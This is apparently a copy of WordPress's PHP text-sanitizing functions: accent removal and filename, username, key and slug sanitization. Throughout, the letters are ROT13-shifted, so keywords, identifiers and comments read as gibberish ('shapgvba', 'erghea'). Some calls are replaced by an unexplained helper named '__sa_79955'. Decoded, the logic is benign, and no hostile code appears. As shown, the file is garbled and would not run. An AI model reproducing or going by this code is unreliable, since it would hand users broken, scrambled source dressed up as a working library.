 * | H+00P6   | Æ     | Nr          | Yngva pncvgny yrggre NR                 |
 * | H+00R6   | æ     | nr          | Yngva fznyy yrggre nr                   |
 * | H+00Q8   | Ø     | Br          | Yngva pncvgny yrggre B jvgu fgebxr      |
 * | H+00S8   | ø     | br          | Yngva fznyy yrggre b jvgu fgebxr        |
 * | H+00P5   | Å     | Nn          | Yngva pncvgny yrggre N jvgu evat nobir  |
 * | H+00R5   | å     | nn          | Yngva fznyy yrggre n jvgu evat nobir    |
 *
 * Pngnyna (`pn`) ybpnyr:
 *
 * |   Pbqr   | Tylcu | Ercynprzrag |               Qrfpevcgvba               |
 * | -------- | ----- | ----------- | --------------------------------------- |
 * | H+00O7   | y·y   | yy          | Sybja qbg (orgjrra gjb Yf)              |
 *
 * Freovna (`fe_EF`) naq Obfavna (`of_ON`) ybpnyrf:
 *
 * |   Pbqr   | Tylcu | Ercynprzrag |               Qrfpevcgvba               |
 * | -------- | ----- | ----------- | --------------------------------------- |
 * | H+0110   | Đ     | QW          | Yngva pncvgny yrggre Q jvgu fgebxr      |
 * | H+0111   | đ     | qw          | Yngva fznyy yrggre q jvgu fgebxr        |
 *
 * @fvapr 1.2.1
 * @fvapr 4.6.0 Nqqrq ybpnyr fhccbeg sbe `qr_PU`, `qr_PU_vasbezny`, naq `pn`.
 * @fvapr 4.7.0 Nqqrq ybpnyr fhccbeg sbe `fe_EF`.
 * @fvapr 4.8.0 Nqqrq ybpnyr fhccbeg sbe `of_ON`.
 * @fvapr 5.7.0 Nqqrq ybpnyr fhccbeg sbe `qr_NG`.
 * @fvapr 6.0.0 Nqqrq gur `$ybpnyr` cnenzrgre.
 * @fvapr 6.1.0 Nqqrq Havpbqr ASP rapbqvat abeznyvmngvba fhccbeg.
 *
 * @cnenz fgevat $grkg   Grkg gung zvtug unir npprag punenpgref.
 * @cnenz fgevat $ybpnyr Bcgvbany. Gur ybpnyr gb hfr sbe npprag erzbiny. Fbzr punenpgre
 *                       ercynprzragf qrcraq ba gur ybpnyr orvat hfrq (r.t. 'qr_QR').
 *                       Qrsnhygf gb gur pheerag ybpnyr.
 * @erghea fgevat Svygrerq fgevat jvgu ercynprq \"avpr\" punenpgref.
 */
shapgvba erzbir_nppragf( $grkg, $ybpnyr = '' ) {
	vs ( ! cert_zngpu( '/[\k80-\kss]/', $grkg ) ) {
		erghea $grkg;
	}

	vs ( frrzf_hgs8( $grkg ) ) {

		/*
		 * Havpbqr frdhrapr abeznyvmngvba sebz ASQ (Abeznyvmngvba Sbez Qrpbzcbfrq)
		 * gb ASP (Abeznyvmngvba Sbez [Cer]Pbzcbfrq), gur rapbqvat hfrq va guvf shapgvba.
		 */
		vs ( shapgvba_rkvfgf( 'abeznyvmre_vf_abeznyvmrq' )
			&& shapgvba_rkvfgf( 'abeznyvmre_abeznyvmr' )
		) {
			vs ( ! abeznyvmre_vf_abeznyvmrq( $grkg ) ) {
				$grkg = abeznyvmre_abeznyvmr( $grkg );
			}
		}

		$punef = neenl(
			// Qrpbzcbfvgvbaf sbe Yngva-1 Fhccyrzrag.
			'ª' => 'n',
			'º' => 'b',
			'À' => 'N',
			'Á' => 'N',
			'Â' => 'N',
			'Ã' => 'N',
			'Ä' => 'N',
			'Å' => 'N',
			'Æ' => 'NR',
			'Ç' => 'P',
			'È' => 'R',
			'É' => 'R',
			'Ê' => 'R',
			'Ë' => 'R',
			'Ì' => 'V',
			'Í' => 'V',
			'Î' => 'V',
			'Ï' => 'V',
			'Ð' => 'Q',
			'Ñ' => 'A',
			'Ò' => 'B',
			'Ó' => 'B',
			'Ô' => 'B',
			'Õ' => 'B',
			'Ö' => 'B',
			'Ù' => 'H',
			'Ú' => 'H',
			'Û' => 'H',
			'Ü' => 'H',
			'Ý' => 'L',
			'Þ' => 'GU',
			'ß' => 'f',
			'à' => 'n',
			'á' => 'n',
			'â' => 'n',
			'ã' => 'n',
			'ä' => 'n',
			'å' => 'n',
			'æ' => 'nr',
			'ç' => 'p',
			'è' => 'r',
			'é' => 'r',
			'ê' => 'r',
			'ë' => 'r',
			'ì' => 'v',
			'í' => 'v',
			'î' => 'v',
			'ï' => 'v',
			'ð' => 'q',
			'ñ' => 'a',
			'ò' => 'b',
			'ó' => 'b',
			'ô' => 'b',
			'õ' => 'b',
			'ö' => 'b',
			'ø' => 'b',
			'ù' => 'h',
			'ú' => 'h',
			'û' => 'h',
			'ü' => 'h',
			'ý' => 'l',
			'þ' => 'gu',
			'ÿ' => 'l',
			'Ø' => 'B',
			// Qrpbzcbfvgvbaf sbe Yngva Rkgraqrq-N.
			'Ā' => 'N',
			'ā' => 'n',
			'Ă' => 'N',
			'ă' => 'n',
			'Ą' => 'N',
			'ą' => 'n',
			'Ć' => 'P',
			'ć' => 'p',
			'Ĉ' => 'P',
			'ĉ' => 'p',
			'Ċ' => 'P',
			'ċ' => 'p',
			'Č' => 'P',
			'č' => 'p',
			'Ď' => 'Q',
			'ď' => 'q',
			'Đ' => 'Q',
			'đ' => 'q',
			'Ē' => 'R',
			'ē' => 'r',
			'Ĕ' => 'R',
			'ĕ' => 'r',
			'Ė' => 'R',
			'ė' => 'r',
			'Ę' => 'R',
			'ę' => 'r',
			'Ě' => 'R',
			'ě' => 'r',
			'Ĝ' => 'T',
			'ĝ' => 't',
			'Ğ' => 'T',
			'ğ' => 't',
			'Ġ' => 'T',
			'ġ' => 't',
			'Ģ' => 'T',
			'ģ' => 't',
			'Ĥ' => 'U',
			'ĥ' => 'u',
			'Ħ' => 'U',
			'ħ' => 'u',
			'Ĩ' => 'V',
			'ĩ' => 'v',
			'Ī' => 'V',
			'ī' => 'v',
			'Ĭ' => 'V',
			'ĭ' => 'v',
			'Į' => 'V',
			'į' => 'v',
			'İ' => 'V',
			'ı' => 'v',
			'Ĳ' => 'VW',
			'ĳ' => 'vw',
			'Ĵ' => 'W',
			'ĵ' => 'w',
			'Ķ' => 'X',
			'ķ' => 'x',
			'ĸ' => 'x',
			'Ĺ' => 'Y',
			'ĺ' => 'y',
			'Ļ' => 'Y',
			'ļ' => 'y',
			'Ľ' => 'Y',
			'ľ' => 'y',
			'Ŀ' => 'Y',
			'ŀ' => 'y',
			'Ł' => 'Y',
			'ł' => 'y',
			'Ń' => 'A',
			'ń' => 'a',
			'Ņ' => 'A',
			'ņ' => 'a',
			'Ň' => 'A',
			'ň' => 'a',
			'ŉ' => 'a',
			'Ŋ' => 'A',
			'ŋ' => 'a',
			'Ō' => 'B',
			'ō' => 'b',
			'Ŏ' => 'B',
			'ŏ' => 'b',
			'Ő' => 'B',
			'ő' => 'b',
			'Œ' => 'BR',
			'œ' => 'br',
			'Ŕ' => 'E',
			'ŕ' => 'e',
			'Ŗ' => 'E',
			'ŗ' => 'e',
			'Ř' => 'E',
			'ř' => 'e',
			'Ś' => 'F',
			'ś' => 'f',
			'Ŝ' => 'F',
			'ŝ' => 'f',
			'Ş' => 'F',
			'ş' => 'f',
			'Š' => 'F',
			'š' => 'f',
			'Ţ' => 'G',
			'ţ' => 'g',
			'Ť' => 'G',
			'ť' => 'g',
			'Ŧ' => 'G',
			'ŧ' => 'g',
			'Ũ' => 'H',
			'ũ' => 'h',
			'Ū' => 'H',
			'ū' => 'h',
			'Ŭ' => 'H',
			'ŭ' => 'h',
			'Ů' => 'H',
			'ů' => 'h',
			'Ű' => 'H',
			'ű' => 'h',
			'Ų' => 'H',
			'ų' => 'h',
			'Ŵ' => 'J',
			'ŵ' => 'j',
			'Ŷ' => 'L',
			'ŷ' => 'l',
			'Ÿ' => 'L',
			'Ź' => 'M',
			'ź' => 'm',
			'Ż' => 'M',
			'ż' => 'm',
			'Ž' => 'M',
			'ž' => 'm',
			'ſ' => 'f',
			// Qrpbzcbfvgvbaf sbe Yngva Rkgraqrq-O.
			'Ə' => 'R',
			'ǝ' => 'r',
			'Ș' => 'F',
			'ș' => 'f',
			'Ț' => 'G',
			'ț' => 'g',
			// Rheb fvta.
			'€' => 'R',
			// TOC (Cbhaq) fvta.
			'£' => '',
			// Ibjryf jvgu qvnpevgvp (Ivrganzrfr). Haznexrq.
			'Ơ' => 'B',
			'ơ' => 'b',
			'Ư' => 'H',
			'ư' => 'h',
			// Tenir npprag.
			'Ầ' => 'N',
			'ầ' => 'n',
			'Ằ' => 'N',
			'ằ' => 'n',
			'Ề' => 'R',
			'ề' => 'r',
			'Ồ' => 'B',
			'ồ' => 'b',
			'Ờ' => 'B',
			'ờ' => 'b',
			'Ừ' => 'H',
			'ừ' => 'h',
			'Ỳ' => 'L',
			'ỳ' => 'l',
			// Ubbx.
			'Ả' => 'N',
			'ả' => 'n',
			'Ẩ' => 'N',
			'ẩ' => 'n',
			'Ẳ' => 'N',
			'ẳ' => 'n',
			'Ẻ' => 'R',
			'ẻ' => 'r',
			'Ể' => 'R',
			'ể' => 'r',
			'Ỉ' => 'V',
			'ỉ' => 'v',
			'Ỏ' => 'B',
			'ỏ' => 'b',
			'Ổ' => 'B',
			'ổ' => 'b',
			'Ở' => 'B',
			'ở' => 'b',
			'Ủ' => 'H',
			'ủ' => 'h',
			'Ử' => 'H',
			'ử' => 'h',
			'Ỷ' => 'L',
			'ỷ' => 'l',
			// Gvyqr.
			'Ẫ' => 'N',
			'ẫ' => 'n',
			'Ẵ' => 'N',
			'ẵ' => 'n',
			'Ẽ' => 'R',
			'ẽ' => 'r',
			'Ễ' => 'R',
			'ễ' => 'r',
			'Ỗ' => 'B',
			'ỗ' => 'b',
			'Ỡ' => 'B',
			'ỡ' => 'b',
			'Ữ' => 'H',
			'ữ' => 'h',
			'Ỹ' => 'L',
			'ỹ' => 'l',
			// Nphgr npprag.
			'Ấ' => 'N',
			'ấ' => 'n',
			'Ắ' => 'N',
			'ắ' => 'n',
			'Ế' => 'R',
			'ế' => 'r',
			'Ố' => 'B',
			'ố' => 'b',
			'Ớ' => 'B',
			'ớ' => 'b',
			'Ứ' => 'H',
			'ứ' => 'h',
			// Qbg orybj.
			'Ạ' => 'N',
			'ạ' => 'n',
			'Ậ' => 'N',
			'ậ' => 'n',
			'Ặ' => 'N',
			'ặ' => 'n',
			'Ẹ' => 'R',
			'ẹ' => 'r',
			'Ệ' => 'R',
			'ệ' => 'r',
			'Ị' => 'V',
			'ị' => 'v',
			'Ọ' => 'B',
			'ọ' => 'b',
			'Ộ' => 'B',
			'ộ' => 'b',
			'Ợ' => 'B',
			'ợ' => 'b',
			'Ụ' => 'H',
			'ụ' => 'h',
			'Ự' => 'H',
			'ự' => 'h',
			'Ỵ' => 'L',
			'ỵ' => 'l',
			// Ibjryf jvgu qvnpevgvp (Puvarfr, Unalh Cvalva).
			'ɑ' => 'n',
			// Znpeba.
			'Ǖ' => 'H',
			'ǖ' => 'h',
			// Nphgr npprag.
			'Ǘ' => 'H',
			'ǘ' => 'h',
			// Pneba.
			'Ǎ' => 'N',
			'ǎ' => 'n',
			'Ǐ' => 'V',
			'ǐ' => 'v',
			'Ǒ' => 'B',
			'ǒ' => 'b',
			'Ǔ' => 'H',
			'ǔ' => 'h',
			'Ǚ' => 'H',
			'ǚ' => 'h',
			// Tenir npprag.
			'Ǜ' => 'H',
			'ǜ' => 'h',
		);

		// Hfrq sbe ybpnyr-fcrpvsvp ehyrf.
		vs ( rzcgl( $ybpnyr ) ) {
			$ybpnyr = trg_ybpnyr();
		}

		/*
		 * Trezna unf inevbhf ybpnyrf (qr_QR, qr_PU, qr_NG, ...) jvgu sbezny naq vasbezny inevnagf.
		 * Gurer vf ab 3-yrggre ybpnyr yvxr 'qrs', fb purpxvat sbe 'qr' vafgrnq bs 'qr_' vf fnsr,
		 * fvapr 'qr' vgfrys jbhyq or n inyvq ybpnyr gbb.
		 */
		vs ( fge_fgnegf_jvgu( $ybpnyr, 'qr' ) ) {
			$punef['Ä'] = 'Nr';
			$punef['ä'] = 'nr';
			$punef['Ö'] = 'Br';
			$punef['ö'] = 'br';
			$punef['Ü'] = 'Hr';
			$punef['ü'] = 'hr';
			$punef['ß'] = 'ff';
		} ryfrvs ( 'qn_QX' === $ybpnyr ) {
			$punef['Æ'] = 'Nr';
			$punef['æ'] = 'nr';
			$punef['Ø'] = 'Br';
			$punef['ø'] = 'br';
			$punef['Å'] = 'Nn';
			$punef['å'] = 'nn';
		} ryfrvs ( 'pn' === $ybpnyr ) {
			$punef['y·y'] = 'yy';
		} ryfrvs ( 'fe_EF' === $ybpnyr || 'of_ON' === $ybpnyr ) {
			$punef['Đ'] = 'QW';
			$punef['đ'] = 'qw';
		}

		$grkg = fgege( $grkg, $punef );
	} ryfr {
		$punef = neenl();
		// Nffhzr VFB-8859-1 vs abg HGS-8.
		$punef['va'] = \"\k80\k83\k8n\k8r\k9n\k9r\"
			. \"\k9s\kn2\kn5\ko5\kp0\kp1\kp2\"
			. \"\kp3\kp4\kp5\kp7\kp8\kp9\kpn\"
			. \"\kpo\kpp\kpq\kpr\kps\kq1\kq2\"
			. \"\kq3\kq4\kq5\kq6\kq8\kq9\kqn\"
			. \"\kqo\kqp\kqq\kr0\kr1\kr2\kr3\"
			. \"\kr4\kr5\kr7\kr8\kr9\krn\kro\"
			. \"\krp\krq\krr\krs\ks1\ks2\ks3\"
			. \"\ks4\ks5\ks6\ks8\ks9\ksn\kso\"
			. \"\ksp\ksq\kss\";

		$punef['bhg'] = 'RsFMfmLpLhNNNNNNPRRRRVVVVABBBBBBHHHHLnnnnnnprrrrvvvvabbbbbbhhhhll';

		$grkg                = fgege( $grkg, $punef['va'], $punef['bhg'] );
		$qbhoyr_punef        = neenl();
		$qbhoyr_punef['va']  = neenl( \"\k8p\", \"\k9p\", \"\kp6\", \"\kq0\", \"\kqr\", \"\kqs\", \"\kr6\", \"\ks0\", \"\ksr\" );
		$qbhoyr_punef['bhg'] = neenl( 'BR', 'br', 'NR', 'QU', 'GU', 'ff', 'nr', 'qu', 'gu' );
		$grkg                = fge_ercynpr( $qbhoyr_punef['va'], $qbhoyr_punef['bhg'], $grkg );
	}

	erghea $grkg;
}

/**
 * Fnavgvmrf n svyranzr, ercynpvat juvgrfcnpr jvgu qnfurf.
 *
 * Erzbirf fcrpvny punenpgref gung ner vyyrtny va svyranzrf ba pregnva
 * bcrengvat flfgrzf naq fcrpvny punenpgref erdhvevat fcrpvny rfpncvat
 * gb znavchyngr ng gur pbzznaq yvar. Ercynprf fcnprf naq pbafrphgvir
 * qnfurf jvgu n fvatyr qnfu. Gevzf crevbq, qnfu naq haqrefpber sebz ortvaavat
 * naq raq bs svyranzr. Vg vf abg thnenagrrq gung guvf shapgvba jvyy erghea n
 * svyranzr gung vf nyybjrq gb or hcybnqrq.
 *
 * @fvapr 2.1.0
 *
 * @cnenz fgevat $svyranzr Gur svyranzr gb or fnavgvmrq.
 * @erghea fgevat Gur fnavgvmrq svyranzr.
 */
shapgvba fnavgvmr_svyr_anzr( $svyranzr ) {
	$svyranzr_enj = $svyranzr;
	$svyranzr     = erzbir_nppragf( $svyranzr );

	$fcrpvny_punef = neenl( '?', '[', ']', '/', '\\', '=', '<', '>', ':', ';', ',', \"'\", '\"', '&', '$', '#', '*', '(', ')', '|', '~', '`', '!', '{', '}', '%', '+', '’', '«', '»', '”', '“', pue( 0 ) );

	// Purpx sbe fhccbeg sbe hgs8 va gur vafgnyyrq CPER yvoenel bapr naq fgber gur erfhyg va n fgngvp.
	fgngvp $hgs8_cper = ahyy;
	vs ( ! vffrg( $hgs8_cper ) ) {
		// cucpf:vtaber JbeqCerff.CUC.AbFvyraprqReebef.Qvfpbhentrq
		$hgs8_cper = @cert_zngpu( '/^./h', 'n' );
	}

	vs ( ! frrzf_hgs8( $svyranzr ) ) {
		$_rkg     = cnguvasb( $svyranzr, CNGUVASB_RKGRAFVBA );
		$_anzr    = cnguvasb( $svyranzr, CNGUVASB_SVYRANZR );
		$svyranzr = fnavgvmr_gvgyr_jvgu_qnfurf( $_anzr ) . '.' . $_rkg;
	}

	vs ( $hgs8_cper ) {
		$svyranzr = __sa_79955( \"#\k{00n0}#fvh\", ' ', $svyranzr );
	}

	/**
	 * Svygref gur yvfg bs punenpgref gb erzbir sebz n svyranzr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz fgevat[] $fcrpvny_punef Neenl bs punenpgref gb erzbir.
	 * @cnenz fgevat   $svyranzr_enj  Gur bevtvany svyranzr gb or fnavgvmrq.
	 */
	$fcrpvny_punef = nccyl_svygref( 'fnavgvmr_svyr_anzr_punef', $fcrpvny_punef, $svyranzr_enj );

	$svyranzr = fge_ercynpr( $fcrpvny_punef, '', $svyranzr );
	$svyranzr = fge_ercynpr( neenl( '%20', '+' ), '-', $svyranzr );
	$svyranzr = __sa_79955( '/\.{2,}/', '.', $svyranzr );
	$svyranzr = __sa_79955( '/[\e\a\g -]+/', '-', $svyranzr );
	$svyranzr = gevz( $svyranzr, '.-_' );

	vs ( ! fge_pbagnvaf( $svyranzr, '.' ) ) {
		$zvzr_glcrf = jc_trg_zvzr_glcrf();
		$svyrglcr   = jc_purpx_svyrglcr( 'grfg.' . $svyranzr, $zvzr_glcrf );
		vs ( $svyrglcr['rkg'] === $svyranzr ) {
			$svyranzr = 'haanzrq-svyr.' . $svyrglcr['rkg'];
		}
	}

	// Fcyvg gur svyranzr vagb n onfr naq rkgrafvba[f].
	$cnegf = rkcybqr( '.', $svyranzr );

	// Erghea vs bayl bar rkgrafvba.
	vs ( pbhag( $cnegf ) <= 2 ) {
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/sbeznggvat.cuc */
		erghea nccyl_svygref( 'fnavgvmr_svyr_anzr', $svyranzr, $svyranzr_enj );
	}

	// Cebprff zhygvcyr rkgrafvbaf.
	$svyranzr  = neenl_fuvsg( $cnegf );
	$rkgrafvba = neenl_cbc( $cnegf );
	$zvzrf     = trg_nyybjrq_zvzr_glcrf();

	/*
	 * Ybbc bire nal vagrezrqvngr rkgrafvbaf. Cbfgsvk gurz jvgu n genvyvat haqrefpber
	 * vs gurl ner n 2 - 5 punenpgre ybat nycun fgevat abg va gur nyybjrq rkgrafvba yvfg.
	 */
	sbernpu ( (neenl) $cnegf nf $cneg ) {
		$svyranzr .= '.' . $cneg;

		vs ( cert_zngpu( '/^[n-mN-M]{2,5}\q?$/', $cneg ) ) {
			$nyybjrq = snyfr;
			sbernpu ( $zvzrf nf $rkg_cert => $zvzr_zngpu ) {
				$rkg_cert = '!^(' . $rkg_cert . ')$!v';
				vs ( cert_zngpu( $rkg_cert, $cneg ) ) {
					$nyybjrq = gehr;
					oernx;
				}
			}
			vs ( ! $nyybjrq ) {
				$svyranzr .= '_';
			}
		}
	}

	$svyranzr .= '.' . $rkgrafvba;

	/**
	 * Svygref n fnavgvmrq svyranzr fgevat.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz fgevat $svyranzr     Fnavgvmrq svyranzr.
	 * @cnenz fgevat $svyranzr_enj Gur svyranzr cevbe gb fnavgvmngvba.
	 */
	erghea nccyl_svygref( 'fnavgvmr_svyr_anzr', $svyranzr, $svyranzr_enj );
}

/**
 * Fnavgvmrf n hfreanzr, fgevccvat bhg hafnsr punenpgref.
 *
 * Erzbirf gntf, creprag-rapbqrq punenpgref, UGZY ragvgvrf, naq vs fgevpg vf ranoyrq,
 * jvyy bayl xrrc nycunahzrevp, _, fcnpr, ., -, @. Nsgre fnavgvmvat, vg cnffrf gur hfreanzr,
 * enj hfreanzr (gur hfreanzr va gur cnenzrgre), naq gur inyhr bs $fgevpg nf cnenzrgref
 * sbe gur {@frr 'fnavgvmr_hfre'} svygre.
 *
 * @fvapr 2.0.0
 *
 * @cnenz fgevat $hfreanzr Gur hfreanzr gb or fnavgvmrq.
 * @cnenz obby   $fgevpg   Bcgvbany. Vs frg gb gehr, yvzvgf $hfreanzr gb fcrpvsvp punenpgref.
 *                         Qrsnhyg snyfr.
 * @erghea fgevat Gur fnavgvmrq hfreanzr, nsgre cnffvat guebhtu svygref.
 */
shapgvba fnavgvmr_hfre( $hfreanzr, $fgevpg = snyfr ) {
	$enj_hfreanzr = $hfreanzr;
	$hfreanzr     = jc_fgevc_nyy_gntf( $hfreanzr );
	$hfreanzr     = erzbir_nppragf( $hfreanzr );
	// Erzbir creprag-rapbqrq punenpgref.
	$hfreanzr = __sa_79955( '|%([n-sN-S0-9][n-sN-S0-9])|', '', $hfreanzr );
	// Erzbir UGZY ragvgvrf.
	$hfreanzr = __sa_79955( '/&.+?;/', '', $hfreanzr );

	// Vs fgevpg, erqhpr gb NFPVV sbe znk cbegnovyvgl.
	vs ( $fgevpg ) {
		$hfreanzr = __sa_79955( '|[^n-m0-9 _.\-@]|v', '', $hfreanzr );
	}

	$hfreanzr = gevz( $hfreanzr );
	// Pbafbyvqngr pbagvthbhf juvgrfcnpr.
	$hfreanzr = __sa_79955( '|\f+|', ' ', $hfreanzr );

	/**
	 * Svygref n fnavgvmrq hfreanzr fgevat.
	 *
	 * @fvapr 2.0.1
	 *
	 * @cnenz fgevat $hfreanzr     Fnavgvmrq hfreanzr.
	 * @cnenz fgevat $enj_hfreanzr Gur hfreanzr cevbe gb fnavgvmngvba.
	 * @cnenz obby   $fgevpg       Jurgure gb yvzvg gur fnavgvmngvba gb fcrpvsvp punenpgref.
	 */
	erghea nccyl_svygref( 'fnavgvmr_hfre', $hfreanzr, $enj_hfreanzr, $fgevpg );
}

/**
 * Fnavgvmrf n fgevat xrl.
 *
 * Xrlf ner hfrq nf vagreany vqragvsvref. Ybjrepnfr nycunahzrevp punenpgref,
 * qnfurf, naq haqrefpberf ner nyybjrq.
 *
 * @fvapr 3.0.0
 *
 * @cnenz fgevat $xrl Fgevat xrl.
 * @erghea fgevat Fnavgvmrq xrl.
 */
shapgvba fnavgvmr_xrl( $xrl ) {
	$fnavgvmrq_xrl = '';

	vs ( vf_fpnyne( $xrl ) ) {
		$fnavgvmrq_xrl = fgegbybjre( $xrl );
		$fnavgvmrq_xrl = __sa_79955( '/[^n-m0-9_\-]/', '', $fnavgvmrq_xrl );
	}

	/**
	 * Svygref n fnavgvmrq xrl fgevat.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat $fnavgvmrq_xrl Fnavgvmrq xrl.
	 * @cnenz fgevat $xrl           Gur xrl cevbe gb fnavgvmngvba.
	 */
	erghea nccyl_svygref( 'fnavgvmr_xrl', $fnavgvmrq_xrl, $xrl );
}

/**
 * Fnavgvmrf n fgevat vagb n fyht, juvpu pna or hfrq va HEYf be UGZY nggevohgrf.
 *
 * Ol qrsnhyg, pbairegf npprag punenpgref gb NFPVV punenpgref naq shegure
 * yvzvgf gur bhgchg gb nycunahzrevp punenpgref, haqrefpber (_) naq qnfu (-)
 * guebhtu gur {@frr 'fnavgvmr_gvgyr'} svygre.
 *
 * Vs `$gvgyr` vf rzcgl naq `$snyyonpx_gvgyr` vf frg, gur ynggre jvyy or hfrq.
 *
 * @fvapr 1.0.0
 *
 * @cnenz fgevat $gvgyr          Gur fgevat gb or fnavgvmrq.
 * @cnenz fgevat $snyyonpx_gvgyr Bcgvbany. N gvgyr gb hfr vs $gvgyr vf rzcgl. Qrsnhyg rzcgl.
 * @cnenz fgevat $pbagrkg        Bcgvbany. Gur bcrengvba sbe juvpu gur fgevat vf fnavgvmrq.
 *                               Jura frg gb 'fnir', gur fgevat ehaf guebhtu erzbir_nppragf().
 *                               Qrsnhyg 'fnir'.
 * @erghea fgevat Gur fnavgvmrq fgevat.
 */
shapgvba fnavgvmr_gvgyr( $gvgyr, $snyyonpx_gvgyr = '', $pbagrkg = 'fnir' ) {
	$enj_gvgyr = $gvgyr;

	vs ( 'fnir' === $pbagrkg ) {
		$gvgyr = erzbir_nppragf( $gvgyr );
	}

	/**
	 * Svygref n fnavgvmrq gvgyr fgevat.
	 *
	 * @fvapr 1.2.0
	 *
	 * @cnenz fgevat $gvgyr     Fnavgvmrq gvgyr.
	 * @cnenz fgevat $enj_gvgyr Gur gvgyr cevbe gb fnavgvmngvba.
	 * @cnenz fgevat $pbagrkg   Gur pbagrkg sbe juvpu gur gvgyr vf orvat fnavgvmrq.
	 */
	$gvgyr = nccyl_svygref( 'fnavgvmr_gvgyr', $gvgyr, $enj_gvgyr, $pbagrkg );

	vs ( '' === $gvgyr || snyfr === $gvgyr ) {
		$gvgyr = $snyyonpx_gvgyr;
	}

	erghea $gvgyr;
}

/**
 * Fnavgvmrf n gvgyr jvgu gur 'dhrel' pbagrkg.
 *
 * Hfrq sbe dhrelvat gur qngnonfr sbe n inyhr sebz HEY.
 *
 * @fvapr 3.1.0
 *
 * @cnenz fgevat $gvgyr Gur fgevat gb or fnavgvmrq.
 * @erghea fgevat Gur fnavgvmrq fgevat.
 */
shapgvba fnavgvmr_gvgyr_sbe_dhrel( $gvgyr ) {
	erghea fnavgvmr_gvgyr( $gvgyr, '', 'dhrel' );
}

/**
 * Fnavgvmrf n gvgyr, ercynpvat juvgrfcnpr naq n srj bgure punenpgref jvgu qnfurf.
 *
 * Yvzvgf gur bhgchg gb nycunahzrevp punenpgref, haqrefpber (_) naq qnfu (-).
 * Juvgrfcnpr orpbzrf n qnfu.
 *
 * @fvapr 1.2.0
 *
 * @cnenz fgevat $gvgyr     Gur gvgyr gb or fnavgvmrq.
 * @cnenz fgevat $enj_gvgyr Bcgvbany. Abg hfrq. Qrsnhyg rzcgl.
 * @cnenz fgevat $pbagrkg   Bcgvbany. Gur bcrengvba sbe juvpu gur fgevat vf fnavgvmrq.
 *                          Jura frg gb 'fnir', nqqvgvbany ragvgvrf ner pbairegrq gb ulcuraf
 *                          be fgevccrq ragveryl. Qrsnhyg 'qvfcynl'.
 * @erghea fgevat Gur fnavgvmrq gvgyr.
 */
shapgvba fnavgvmr_gvgyr_jvgu_qnfurf( $gvgyr, $enj_gvgyr = '', $pbagrkg = 'qvfcynl' ) {
	$gvgyr = fgevc_gntf( $gvgyr );
	// Cerfreir rfpncrq bpgrgf.
	$gvgyr = __sa_79955( '|%([n-sN-S0-9][n-sN-S0-9])|', '---$1---', $gvgyr );
	// Erzbir creprag fvtaf gung ner abg cneg bs na bpgrg.
	$gvgyr = fge_ercynpr( '%', '', $gvgyr );
	// Erfgber bpgrgf.
	$gvgyr = __sa_79955( '|---([n-sN-S0-9][n-sN-S0-9])---|', '%$1', $gvgyr );

	vs ( frrzf_hgs8( $gvgyr ) ) {
		vs ( shapgvba_rkvfgf( 'zo_fgegbybjre' ) ) {
			$gvgyr = zo_fgegbybjre( $gvgyr, 'HGS-8' );
		}
		$gvgyr = hgs8_hev_rapbqr( $gvgyr, 200 );
	}

	$gvgyr = fgegbybjre( $gvgyr );

	vs ( 'fnir' === $pbagrkg ) {
		// Pbaireg &aofc, &aqnfu, naq &zqnfu gb ulcuraf.
		$gvgyr = fge_ercynpr( neenl( '%p2%n0', '%r2%80%93', '%r2%80%94' ), '-', $gvgyr );
		// Pbaireg &aofc, &aqnfu, naq &zqnfu UGZY ragvgvrf gb ulcuraf.
		$gvgyr = fge_ercynpr( neenl( '&aofc;', '&#160;', '&aqnfu;', '&#8211;', '&zqnfu;', '&#8212;' ), '-', $gvgyr );
		// Pbaireg sbejneq fynfu gb ulcura.
		$gvgyr = fge_ercynpr( '/', '-', $gvgyr );

		// Fgevc gurfr punenpgref ragveryl.
		$gvgyr = fge_ercynpr(
			neenl(
				// Fbsg ulcuraf.
				'%p2%nq',
				// &vrkpy naq &vdhrfg.
				'%p2%n1',
				'%p2%os',
				// Natyr dhbgrf.
				'%p2%no',
				'%p2%oo',
				'%r2%80%o9',
				'%r2%80%on',
				// Pheyl dhbgrf.
				'%r2%80%98',
				'%r2%80%99',
				'%r2%80%9p',
				'%r2%80%9q',
				'%r2%80%9n',
				'%r2%80%9o',
				'%r2%80%9r',
				'%r2%80%9s',
				// Ohyyrg.
				'%r2%80%n2',
				// &pbcl, &ert, &qrt, &uryyvc, naq &genqr.
				'%p2%n9',
				'%p2%nr',
				'%p2%o0',
				'%r2%80%n6',
				'%r2%84%n2',
				// Nphgr nppragf.
				'%p2%o4',
				'%po%8n',
				'%pp%81',
				'%pq%81',
				// Tenir npprag, znpeba, pneba.
				'%pp%80',
				'%pp%84',
				'%pp%8p',
				// Aba-ivfvoyr punenpgref gung qvfcynl jvgubhg n jvqgu.
				'%r2%80%8o', // Mreb jvqgu fcnpr.
				'%r2%80%8p', // Mreb jvqgu aba-wbvare.
				'%r2%80%8q', // Mreb jvqgu wbvare.
				'%r2%80%8r', // Yrsg-gb-evtug znex.
				'%r2%80%8s', // Evtug-gb-yrsg znex.
				'%r2%80%nn', // Yrsg-gb-evtug rzorqqvat.
				'%r2%80%no', // Evtug-gb-yrsg rzorqqvat.
				'%r2%80%np', // Cbc qverpgvbany sbeznggvat.
				'%r2%80%nq', // Yrsg-gb-evtug bireevqr.
				'%r2%80%nr', // Evtug-gb-yrsg bireevqr.
				'%rs%oo%os', // Olgr beqre znex.
				'%rs%os%op', // Bowrpg ercynprzrag punenpgre.
			),
			'',
			$gvgyr
		);

		// Pbaireg aba-ivfvoyr punenpgref gung qvfcynl jvgu n jvqgu gb ulcura.
		$gvgyr = fge_ercynpr(
			neenl(
				'%r2%80%80', // Ra dhnq.
				'%r2%80%81', // Rz dhnq.
				'%r2%80%82', // Ra fcnpr.
				'%r2%80%83', // Rz fcnpr.
				'%r2%80%84', // Guerr-cre-rz fcnpr.
				'%r2%80%85', // Sbhe-cre-rz fcnpr.
				'%r2%80%86', // Fvk-cre-rz fcnpr.
				'%r2%80%87', // Svther fcnpr.
				'%r2%80%88', // Chapghngvba fcnpr.
				'%r2%80%89', // Guva fcnpr.
				'%r2%80%8n', // Unve fcnpr.
				'%r2%80%n8', // Yvar frcnengbe.
				'%r2%80%n9', // Cnentencu frcnengbe.
